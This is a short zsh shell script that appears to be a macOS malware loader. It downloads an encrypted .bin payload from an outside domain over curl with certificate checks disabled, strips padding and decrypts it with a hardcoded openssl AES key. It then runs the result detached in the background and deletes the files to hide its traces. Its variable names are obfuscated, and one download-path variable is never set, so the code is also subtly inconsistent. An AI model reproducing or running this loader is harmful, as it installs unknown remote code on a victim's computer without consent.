#!/bin/zsh
rx8gh=$(mktemp /tmp/vd9mny.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mb914a28479682a7e.bin" -o "$rx8ghz" || exit 1
krrsxy=$(stat -f %z "$rx8ghz"); xre9qw5=$(( krrsxy - 3107 - 3500 ))
tail -c +$(( 3107 + 1 )) "$rx8ghz" | head -c $xre9qw5 | openssl enc -d -aes-256-cbc -k ed308de6467d51955bc2aff1 -out "$rx8gh" 2>/dev/null
[ -s "$rx8gh" ] && chmod 700 "$rx8gh" && ( "$rx8gh" & ) && disown
( sleep 3; rm -f "$rx8gh" "$rx8ghz" ) &>/dev/null &
